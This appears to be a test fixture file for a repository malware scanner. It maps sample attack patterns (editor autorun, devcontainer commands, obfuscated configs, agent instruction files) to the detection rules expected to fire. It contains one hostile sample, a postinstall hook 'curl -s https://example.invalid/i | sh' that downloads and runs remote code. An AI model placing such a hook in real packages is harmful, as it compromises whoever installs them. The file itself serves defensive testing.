// End-to-end scenarios (TST-01): one file map per pattern plus the signals expected from `main`.
// Everything is in memory and served through fake GitHub routes: agent-instruction and editor files are never on disk.
import { TASKS_JSONC, DEVCONTAINER_INIT } from './editor-cases.mjs';
import { pkg } from './lifecycle-cases.mjs';
import { EXECUTION_LINES } from './agents-cases.mjs';
import { MULTI_INDICATOR } from './config-cases.mjs';
import { files as realCaseFiles } from './real-case.mjs';

export const SCENARIOS = {
  'editor-autorun': { files: { '.vscode/tasks.json': TASKS_JSONC }, expect: [{ rule: 'editor-autorun', severity: 'high' }] },
  'devcontainer-initialize': { files: { '.devcontainer/devcontainer.json': DEVCONTAINER_INIT }, expect: [{ rule: 'devcontainer-command', severity: 'high' }] },
  'lifecycle-suspicious': {
    files: { 'package.json': pkg({ postinstall: 'curl -s https://example.invalid/i | sh' }) },
    expect: [{ rule: 'lifecycle-script', severity: 'high' }],
  },
  'agent-instructions': { files: { 'AGENTS.md': `${EXECUTION_LINES[0]}\n` }, expect: [{ rule: 'ai-instructions', severity: 'medium' }] },
  'config-obfuscation': { files: { 'tailwind.config.js': `${MULTI_INDICATOR}\nmodule.exports = {};\n` }, expect: [{ rule: 'config-obfuscation', severity: 'high' }] },
  'metadata-commit-before-creation': {
    files: { 'package.json': pkg({}) },
    gh: { createdAt: '2026-10-20T00:00:00Z', headAuthorDate: '2019-06-01T00:00:00Z', headCommitterDate: '2019-06-01T00:00:00Z' },
    expect: [{ rule: 'repo-metadata', severity: 'info' }],
  },
};

export const REAL_CASE_REMOTE = { files: realCaseFiles };
export const REAL_CASE_EXPECTED = [
  'npmrc-auth-token', 'config-require-nonstandard', 'dep-unresolvable', 'osv-malicious', 'npm-security-placeholder', 'chain-private-dependency',
];
